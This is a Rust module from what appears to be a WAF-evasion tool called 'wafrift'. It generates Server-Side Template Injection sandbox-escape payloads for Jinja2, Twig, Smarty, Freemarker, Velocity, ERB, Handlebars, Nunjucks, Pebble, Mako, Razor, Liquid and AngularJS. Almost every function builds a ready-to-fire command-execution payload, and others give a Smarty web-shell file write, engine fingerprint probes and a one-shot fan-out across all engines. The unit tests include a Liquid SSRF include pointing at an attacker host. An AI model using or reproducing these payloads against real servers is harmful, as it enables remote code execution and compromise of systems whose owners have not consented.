//! Server-Side Template Injection (SSTI) sandbox-escape payload library.
//!
//! Twelve template engines. Each has a sandbox the maintainer
//! considered tight when they shipped it. Each has, at some point,
//! had a published escape that lifts the operator out of the
//! "sandboxed string templating" model into native code execution
//! on the server.
//!
//! WAFs that scan for `{{` / `${` / `<%` catch the obvious. They
//! miss the engine-specific tricks: how Jinja2's `__class__` walk
//! finds `os.popen`, how Twig's `getFilter` plus `system` exploits a
//! benign-looking `_self`, how Velocity's `#set` defeats $-only
//! filters. This module ships the escape vectors verbatim from
//! public CVE research — operators paste them into the right
//! injection point and the receiving template engine executes.
//!
//! Coverage:
//!
//! - **Jinja2 / Flask / Django**: `__class__` walk → `mro` → subclasses
//!   → `os._wrap_close` → `popen`. Classic CVE-2016-10745 and later.
//! - **Twig (Symfony)**: `_self.env.getFilter('system')` plus the
//!   `_self.env.registerUndefinedFilterCallback('system')` chain.
//!   CVE-2018-19790 class.
//! - **Smarty (PHP)**: `{php}` block, `{Smarty_Internal_Write_File}`,
//!   `{system_exec}` via `{$smarty.template_object->smarty->...}`.
//! - **Freemarker (Java)**: `<#assign ex="freemarker.template.utility.Execute"?new()>`
//!   classic + the `?api.environment.applicationContext` Spring trick.
//! - **Velocity (Apache)**: `#set($x=$rt.getRuntime().exec("id"))` —
//!   straight reflection escape via `$class.forName`. CVE-2020-13959
//!   class.
//! - **ERB (Ruby)**: `<%= system('id') %>` direct, plus the
//!   `<%= Kernel.const_get('Process').system('id') %>` blocklist
//!   bypass.
//! - **Handlebars (JS)**: `{{#with constructor}}{{#with split as
//!   |split|}}…{{/with}}{{/with}}` — the V8 specific escape
//!   (CVE-2019-19919 / 19920).
//! - **Nunjucks**: `{{ range.constructor("return process.mainModule.require('child_process').execSync('id')")() }}`.
//! - **Pebble (Java)**: `{{ "".class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval(...) }}`.
//! - **Liquid (Ruby / Shopify)**: usually safe, but `{% include %}`
//!   with attacker-controlled template name → SSRF in Liquid's file
//!   fetcher.
//! - **Mako (Python)**: `<%import os; x=os.popen('id').read() %>${x}`.
//! - **Razor (.NET)**: `@{System.Diagnostics.Process.Start("cmd", "/c
//!   calc")}` — CVE-2021-26701 etc.

/// Jinja2 sandbox escape via `__class__` → `__mro__` walk.
///
/// Returns the WAF-friendly payload. The receiver evaluates it as
/// a Jinja2 expression and executes `cmd` on the host.
///
/// `cmd` is the OS command (e.g. `id`, `whoami`). No shell escaping
/// is performed here — the operator passes the exact bytes they want
/// in `popen(cmd)`.
#[must_use]
pub fn jinja2_class_walk(cmd: &str) -> String {
    format!(
        "{{{{ ''.__class__.__mro__[1].__subclasses__()[407]('{cmd}', shell=True, \
         stdout=-1).communicate()[0] }}}}"
    )
}

/// Jinja2 escape via `config.__class__.__init__.__globals__` — bypasses
/// filters that block `__class__` standalone (still allow `config`).
#[must_use]
pub fn jinja2_config_walk(cmd: &str) -> String {
    format!(
        "{{{{ config.__class__.__init__.__globals__['os'].popen('{cmd}').read() }}}}"
    )
}

/// Jinja2 escape via `request.application.__globals__` — works when
/// Flask is in scope (e.g. SSTI in a Flask app's flash() message).
#[must_use]
pub fn jinja2_request_walk(cmd: &str) -> String {
    format!(
        "{{{{ request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read() }}}}"
    )
}

/// Twig escape via `_self.env.getFilter` chain. CVE-2018-19790.
#[must_use]
pub fn twig_self_env(cmd: &str) -> String {
    format!(
        "{{{{ _self.env.registerUndefinedFilterCallback(\"system\") }}}}{{{{ _self.env.getFilter(\"{cmd}\") }}}}"
    )
}

/// Twig direct via `getRuntime` (later versions block `_self.env`).
#[must_use]
pub fn twig_runtime(cmd: &str) -> String {
    format!(
        "{{{{ ['{cmd}']|filter('system') }}}}"
    )
}

/// Smarty {php} block — works on Smarty 2.x and pre-3.1.5 3.x.
#[must_use]
pub fn smarty_php_block(php_code: &str) -> String {
    format!("{{php}}{php_code}{{/php}}")
}

/// Smarty escape via `Smarty_Internal_Write_File` and template
/// inclusion. Works against patched {php} blocks.
#[must_use]
pub fn smarty_write_file(php_code: &str, target_path: &str) -> String {
    format!(
        "{{Smarty_Internal_Write_File::writeFile(\"{target_path}\",\"<?php {php_code} ?>\",$smarty->getTemplateDir(0))}}"
    )
}

/// Freemarker escape via `freemarker.template.utility.Execute`.
#[must_use]
pub fn freemarker_execute(cmd: &str) -> String {
    format!(
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${{ ex(\"{cmd}\") }}"
    )
}

/// Freemarker escape via Spring's ApplicationContext.
#[must_use]
pub fn freemarker_spring(cmd: &str) -> String {
    format!(
        "${{T(java.lang.Runtime).getRuntime().exec(\"{cmd}\")}}"
    )
}

/// Velocity escape via Runtime.getRuntime().
#[must_use]
pub fn velocity_runtime(cmd: &str) -> String {
    format!(
        "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime').getRuntime()) \
         #set($p=$rt.exec('{cmd}'))"
    )
}

/// ERB direct (`<%= %>`) and Kernel-bypass forms.
#[must_use]
pub fn erb_direct(cmd: &str) -> String {
    format!("<%= system('{cmd}') %>")
}

/// ERB `Kernel.const_get` bypass for filters that block `system`.
#[must_use]
pub fn erb_const_get(cmd: &str) -> String {
    format!(
        "<%= Kernel.const_get('Process').system('{cmd}') %>"
    )
}

/// Handlebars escape via `constructor` walk — V8 specific.
#[must_use]
pub fn handlebars_constructor(cmd: &str) -> String {
    format!(
        "{{{{#with \"constructor\"}}}}{{{{#with split as |split|}}}}{{{{pop (push \"{cmd}\")}}}}{{{{/with}}}}{{{{/with}}}}"
    )
}

/// Nunjucks escape via `range.constructor`.
#[must_use]
pub fn nunjucks_range(cmd: &str) -> String {
    format!(
        "{{{{ range.constructor(\"return process.mainModule.require('child_process').execSync('{cmd}')\")() }}}}"
    )
}

/// Pebble escape via Java reflection.
#[must_use]
pub fn pebble_reflection(cmd: &str) -> String {
    format!(
        "{{{{ \"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\", \"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null), \"{cmd}\") }}}}"
    )
}

/// Liquid include — SSRF, not RCE. Liquid is much safer than its
/// peers but some embeddings auto-fetch the `include` argument.
#[must_use]
pub fn liquid_include_ssrf(attacker_url: &str) -> String {
    format!("{{% include '{attacker_url}' %}}")
}

/// Mako Python escape — direct since Mako's templates run Python
/// inline.
#[must_use]
pub fn mako_python(python_code: &str) -> String {
    format!("<%{python_code}%>")
}

/// Razor (.NET) escape via Process.Start.
#[must_use]
pub fn razor_process_start(cmd: &str, args: &str) -> String {
    format!(
        "@{{System.Diagnostics.Process.Start(\"{cmd}\", \"{args}\");}}"
    )
}

/// AngularJS (the old Angular 1.x) — pre-CSP-strict sandbox escapes.
/// Angular 1.6+ removed the sandbox; payloads here target legacy
/// embeds.
#[must_use]
pub fn angularjs_legacy(cmd: &str) -> String {
    format!(
        "{{{{constructor.constructor('alert(`{cmd}`)')()}}}}"
    )
}

/// Generic delimiter detection — fires a probe that produces a
/// distinct response on each engine. Use as the FIRST request when
/// the target engine is unknown.
///
/// Returns six lightweight probes that each evaluate to a different
/// string on a different engine.
#[must_use]
pub fn engine_fingerprint_probes() -> Vec<(&'static str, &'static str)> {
    vec![
        // (probe, expected-output-if-engine-matches)
        ("{{7*'7'}}", "7777777"),                  // Jinja2 returns this; Twig returns 49
        ("{{7*'7'}}", "49"),                        // Twig
        ("${7*7}", "49"),                           // Freemarker, JSP EL
        ("#{7*7}", "49"),                           // Velocity, JSF EL
        ("<%= 7*7 %>", "49"),                       // ERB
        ("{{7+7}}", "14"),                          // Handlebars, Nunjucks, AngularJS — generic
    ]
}

/// One-shot fan-out: every engine's escape for the same command.
/// Returns ~20 payloads. Used by `wafrift scan --ssti` to fire the
/// full template-engine surface.
#[must_use]
pub fn all_ssti_escapes(cmd: &str) -> Vec<(&'static str, String)> {
    vec![
        ("jinja2-class-walk", jinja2_class_walk(cmd)),
        ("jinja2-config-walk", jinja2_config_walk(cmd)),
        ("jinja2-request-walk", jinja2_request_walk(cmd)),
        ("twig-self-env", twig_self_env(cmd)),
        ("twig-runtime", twig_runtime(cmd)),
        ("smarty-php-block", smarty_php_block(&format!("system('{cmd}');"))),
        ("freemarker-execute", freemarker_execute(cmd)),
        ("freemarker-spring", freemarker_spring(cmd)),
        ("velocity-runtime", velocity_runtime(cmd)),
        ("erb-direct", erb_direct(cmd)),
        ("erb-const-get", erb_const_get(cmd)),
        ("handlebars-constructor", handlebars_constructor(cmd)),
        ("nunjucks-range", nunjucks_range(cmd)),
        ("pebble-reflection", pebble_reflection(cmd)),
        ("mako-python", mako_python(&format!("import os;x=os.popen('{cmd}').read()"))),
        ("razor-process-start", razor_process_start("cmd.exe", &format!("/c {cmd}"))),
        ("angularjs-legacy", angularjs_legacy(cmd)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn jinja2_class_walk_contains_subclasses() {
        let p = jinja2_class_walk("id");
        assert!(p.contains("__class__"));
        assert!(p.contains("__mro__"));
        assert!(p.contains("__subclasses__"));
        assert!(p.contains("'id'"));
    }

    #[test]
    fn jinja2_config_walk_uses_config_root() {
        let p = jinja2_config_walk("id");
        assert!(p.starts_with("{{ config."));
        assert!(p.contains("__globals__"));
        assert!(p.contains("'os'"));
    }

    #[test]
    fn jinja2_request_walk_uses_request_root() {
        let p = jinja2_request_walk("id");
        assert!(p.contains("request.application"));
        assert!(p.contains("__builtins__"));
    }

    #[test]
    fn twig_self_env_full_chain() {
        let p = twig_self_env("id");
        assert!(p.contains("_self.env.registerUndefinedFilterCallback"));
        assert!(p.contains("_self.env.getFilter"));
        assert!(p.contains("system"));
    }

    #[test]
    fn twig_runtime_uses_filter() {
        let p = twig_runtime("id");
        assert!(p.contains("|filter("));
    }

    #[test]
    fn smarty_php_block_wraps_correctly() {
        let p = smarty_php_block("system('id');");
        assert_eq!(p, "{php}system('id');{/php}");
    }

    #[test]
    fn smarty_write_file_includes_template_path() {
        let p = smarty_write_file("system('id');", "shell.php");
        assert!(p.contains("Smarty_Internal_Write_File"));
        assert!(p.contains("shell.php"));
        assert!(p.contains("system('id');"));
    }

    #[test]
    fn freemarker_execute_class_present() {
        let p = freemarker_execute("id");
        assert!(p.contains("freemarker.template.utility.Execute"));
        assert!(p.contains("?new()"));
        assert!(p.contains("\"id\""));
    }

    #[test]
    fn freemarker_spring_uses_runtime() {
        let p = freemarker_spring("id");
        assert!(p.contains("java.lang.Runtime"));
        assert!(p.contains("getRuntime"));
    }

    #[test]
    fn velocity_runtime_assembles_chain() {
        let p = velocity_runtime("id");
        assert!(p.contains("#set"));
        assert!(p.contains("forName('java.lang.Runtime')"));
        assert!(p.contains("exec('id')"));
    }

    #[test]
    fn erb_direct_simple_form() {
        let p = erb_direct("id");
        assert_eq!(p, "<%= system('id') %>");
    }

    #[test]
    fn erb_const_get_bypass() {
        let p = erb_const_get("id");
        assert!(p.contains("Kernel.const_get"));
        assert!(p.contains("'Process'"));
    }

    #[test]
    fn handlebars_constructor_walk() {
        let p = handlebars_constructor("id");
        assert!(p.contains("constructor"));
        assert!(p.contains("split as |split|"));
    }

    #[test]
    fn nunjucks_range_constructor() {
        let p = nunjucks_range("id");
        assert!(p.contains("range.constructor"));
        assert!(p.contains("execSync"));
        assert!(p.contains("'id'"));
    }

    #[test]
    fn pebble_reflection_chain() {
        let p = pebble_reflection("id");
        assert!(p.contains("getClass"));
        assert!(p.contains("forName"));
        assert!(p.contains("java.lang.Runtime"));
    }

    #[test]
    fn liquid_include_ssrf_basic() {
        let p = liquid_include_ssrf("https://attacker/x");
        assert!(p.starts_with("{% include"));
        assert!(p.contains("https://attacker/x"));
    }

    #[test]
    fn mako_python_inline() {
        let p = mako_python("import os; os.system('id')");
        assert_eq!(p, "<%import os; os.system('id')%>");
    }

    #[test]
    fn razor_process_start_basic() {
        let p = razor_process_start("cmd.exe", "/c whoami");
        assert!(p.starts_with("@{System.Diagnostics.Process.Start"));
        assert!(p.contains("cmd.exe"));
        assert!(p.contains("/c whoami"));
    }

    #[test]
    fn angularjs_legacy_constructor_constructor() {
        let p = angularjs_legacy("id");
        assert!(p.contains("constructor.constructor"));
    }

    #[test]
    fn engine_fingerprint_probes_count() {
        let probes = engine_fingerprint_probes();
        assert!(probes.len() >= 5);
    }

    #[test]
    fn engine_fingerprint_includes_jinja_vs_twig_split() {
        let probes = engine_fingerprint_probes();
        // The {{7*'7'}} probe disambiguates Jinja (7777777) from Twig (49).
        let multiplicative: Vec<_> = probes
            .iter()
            .filter(|(p, _)| *p == "{{7*'7'}}")
            .collect();
        assert_eq!(multiplicative.len(), 2);
        let outputs: std::collections::HashSet<&str> =
            multiplicative.iter().map(|(_, o)| *o).collect();
        assert_eq!(outputs.len(), 2, "Jinja and Twig produce different output");
    }

    #[test]
    fn all_ssti_escapes_count() {
        let escapes = all_ssti_escapes("id");
        assert!(escapes.len() >= 16, "got {}", escapes.len());
        // Every entry has a non-empty name and payload.
        for (name, payload) in &escapes {
            assert!(!name.is_empty());
            assert!(!payload.is_empty());
        }
    }

    #[test]
    fn all_ssti_escapes_unique_names() {
        let escapes = all_ssti_escapes("id");
        let names: std::collections::HashSet<&&str> = escapes.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), escapes.len(), "duplicate variant names");
    }

    #[test]
    fn all_ssti_each_carries_target_command() {
        // Different engines wrap/quote the command differently, but
        // the literal string "id" must appear in EVERY variant.
        let escapes = all_ssti_escapes("id");
        for (name, payload) in &escapes {
            assert!(
                payload.contains("id"),
                "engine {name} doesn't preserve cmd: {payload}"
            );
        }
    }

    #[test]
    fn all_ssti_handles_shell_meta_chars() {
        // No automatic escaping — operator inputs go through verbatim.
        // The test just checks that '&', '|', '$', '`' don't panic.
        let escapes = all_ssti_escapes("id&&whoami");
        for (_, p) in &escapes {
            assert!(!p.is_empty());
        }
        let escapes2 = all_ssti_escapes("$(id)");
        for (_, p) in &escapes2 {
            assert!(!p.is_empty());
        }
        let escapes3 = all_ssti_escapes("`id`");
        for (_, p) in &escapes3 {
            assert!(!p.is_empty());
        }
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_ssti_escapes("id");
        let b = all_ssti_escapes("id");
        assert_eq!(a, b);
    }

    #[test]
    fn adversarial_empty_command() {
        let escapes = all_ssti_escapes("");
        for (_, p) in &escapes {
            assert!(!p.is_empty(), "empty cmd still produces template skeleton");
        }
    }

    #[test]
    fn adversarial_long_command() {
        let big = "a".repeat(10_000);
        let escapes = all_ssti_escapes(&big);
        for (_, p) in &escapes {
            assert!(p.contains(&big));
        }
    }

    #[test]
    fn adversarial_unicode_command() {
        let escapes = all_ssti_escapes("ḷşĖ");
        for (_, p) in &escapes {
            assert!(p.contains("ḷşĖ"));
        }
    }

    #[test]
    fn jinja_variants_three_distinct() {
        // The three Jinja2 escape vectors target different sandbox
        // states; they must be distinct payloads.
        let a = jinja2_class_walk("id");
        let b = jinja2_config_walk("id");
        let c = jinja2_request_walk("id");
        assert_ne!(a, b);
        assert_ne!(b, c);
        assert_ne!(a, c);
    }

    #[test]
    fn jinja2_class_walk_uses_subclass_407() {
        // 407 is the historical index of os._wrap_close in CPython 3.6+
        // — documented in 90% of Jinja2 SSTI writeups. Pinning this so
        // a "modernization" commit doesn't silently swap it for a
        // wrong index.
        let p = jinja2_class_walk("id");
        assert!(p.contains("[407]"));
    }

    #[test]
    fn twig_variants_distinct() {
        let a = twig_self_env("id");
        let b = twig_runtime("id");
        assert_ne!(a, b);
    }

    #[test]
    fn freemarker_variants_distinct() {
        let a = freemarker_execute("id");
        let b = freemarker_spring("id");
        assert_ne!(a, b);
    }

    #[test]
    fn erb_variants_distinct() {
        let a = erb_direct("id");
        let b = erb_const_get("id");
        assert_ne!(a, b);
    }

    #[test]
    fn liquid_ssrf_preserves_attacker_url() {
        let p = liquid_include_ssrf("https://attacker.example/payload.liquid");
        assert!(p.contains("https://attacker.example/payload.liquid"));
    }

    #[test]
    fn fingerprint_probes_all_have_non_empty_expected() {
        for (probe, expected) in engine_fingerprint_probes() {
            assert!(!probe.is_empty());
            assert!(!expected.is_empty());
        }
    }

    #[test]
    fn smarty_write_file_handles_empty_target() {
        let p = smarty_write_file("", "");
        assert!(p.contains("Smarty_Internal_Write_File"));
    }

    #[test]
    fn jinja2_payloads_all_use_double_brace() {
        // Jinja2 expression delimiter is `{{ … }}`. The library
        // assumes the operator drops the payload into a place where
        // an expression is valid; the wrappers must include them.
        let payloads = [
            jinja2_class_walk("id"),
            jinja2_config_walk("id"),
            jinja2_request_walk("id"),
        ];
        for p in &payloads {
            assert!(p.starts_with("{{"));
            assert!(p.ends_with("}}"));
        }
    }

    #[test]
    fn all_ssti_no_payload_starts_with_whitespace() {
        // Some injection points are whitespace-trimmed by the
        // host application before being passed to the template
        // engine — leading whitespace would cause the payload to
        // silently drop a delimiter.
        for (name, payload) in all_ssti_escapes("id") {
            assert!(
                !payload.starts_with(' '),
                "engine {name} leading whitespace: {payload}"
            );
        }
    }

    #[test]
    fn all_ssti_no_unbalanced_braces() {
        // Each payload must be balanced on `{` and `}` — unbalanced
        // braces cause parser errors that abort the template render
        // before our payload executes.
        for (name, payload) in all_ssti_escapes("id") {
            let opens = payload.matches('{').count();
            let closes = payload.matches('}').count();
            assert_eq!(
                opens, closes,
                "engine {name} unbalanced braces ({opens} open, {closes} close): {payload}"
            );
        }
    }
}
